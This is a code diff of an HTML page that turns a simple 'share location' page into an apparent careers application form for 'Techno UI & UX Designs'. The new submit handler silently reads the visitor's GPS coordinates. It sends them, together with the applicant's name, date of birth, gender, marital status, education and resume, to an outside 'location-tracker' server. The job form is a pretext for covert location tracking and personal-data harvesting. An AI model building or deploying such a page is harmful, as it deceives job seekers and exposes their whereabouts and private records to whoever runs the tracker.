@@ -1,43 +1,122 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Get Location</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Careers - Techno UI & UX Designs</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+    h1 {
+      text-align: center;
+      color: #333;
+    }
+    form {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
 </head>
 <body>
-  <h1>Click to share your location</h1>
-  <button onclick="getLocation()">Share Location</button>
+
+  <h1>Careers at Techno UI & UX Designs</h1>
+  <form id="careerForm">
+    <label for="name">Full Name:</label>
+    <input type="text" id="name" required>
+
+    <label for="dob">Date of Birth:</label>
+    <input type="date" id="dob" required>
+
+    <label for="gender">Gender:</label>
+    <select id="gender" required>
+      <option value="">Select</option>
+      <option value="Male">Male</option>
+      <option value="Female">Female</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label for="education">Highest Education:</label>
+    <input type="text" id="education" required>
+
+    <label for="marital">Marital Status:</label>
+    <select id="marital" required>
+      <option value="">Select</option>
+      <option value="Single">Single</option>
+      <option value="Married">Married</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label for="preferred">Preferred Location:</label>
+    <input type="text" id="preferred" required>
+
+    <label for="resume">Attach Resume (PDF):</label>
+    <input type="file" id="resume" accept=".pdf" required>
+
+    <button type="button" onclick="submitForm()">Submit Form</button>
+  </form>
 
   <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition, showError);
-      } else {
-        alert("Geolocation is not supported by this browser.");
+    function submitForm() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
       }
-    }
 
-    function sendPosition(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude
-      };
+      navigator.geolocation.getCurrentPosition((position) => {
+        const formData = new FormData();
+        formData.append("name", document.getElementById("name").value);
+        formData.append("dob", document.getElementById("dob").value);
+        formData.append("gender", document.getElementById("gender").value);
+        formData.append("education", document.getElementById("education").value);
+        formData.append("marital", document.getElementById("marital").value);
+        formData.append("preferred", document.getElementById("preferred").value);
+        formData.append("latitude", position.coords.latitude);
+        formData.append("longitude", position.coords.longitude);
+        formData.append("resume", document.getElementById("resume").files[0]);
 
-      fetch("https://location-tracker-gmpf.onrender.com/save-location", {
-
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      }).then(res => {
-        alert("Location saved!");
-      }).catch(err => {
-        alert("Failed to send location.");
+        fetch("https://location-tracker-gmpf.onrender.com/submit-career-form", {
+          method: "POST",
+          body: formData,
+        })
+        .then(response => response.text())
+        .then(data => alert(data))
+        .catch(error => alert("Failed to submit form."));
+      }, (error) => {
+        alert("Unable to get location: " + error.message);
       });
-    }
-
-    function showError(error) {
-      alert("Error getting location: " + error.message);
     }
   </script>
 </body>
